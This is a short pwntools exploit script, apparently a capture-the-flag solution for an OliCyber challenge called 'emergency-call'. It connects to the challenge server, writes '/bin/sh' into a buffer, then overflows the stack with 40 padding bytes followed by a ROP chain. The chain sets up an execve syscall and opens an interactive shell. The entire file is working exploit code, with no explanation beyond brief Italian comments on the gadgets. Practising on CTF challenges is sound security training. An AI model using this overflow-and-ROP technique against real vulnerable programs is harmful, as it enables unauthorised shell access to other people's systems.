from pwn import * 

p = remote('emergency.challs.olicyber.it', 10306)
#p = process('./emergency-call')
#gdb.attach(p)
context(arch='amd64')

chain = flat([
    0x0000000000401032,  # pop rdi; ret; 
    0x3b              ,  #execve      
    0x0000000000401038, # xor rax, rdi; ret;

    0x0000000000401032,  # pop rdi; ret; 
    0x404000           , #indirizzo del buffer dove scriviamo binsh
    
    0x0000000000401034, # pop rsi; ret;
    0x0                ,

    0x0000000000401036, #pop rdx; ret;
    0x0             ,
    0x000000000040101a, #  syscall; 

])


p.recvuntil(b"> ")
p.send(b'/bin/sh')
p.recvuntil(b"> ")
p.send( b'a'*40 + chain)
p.interactive()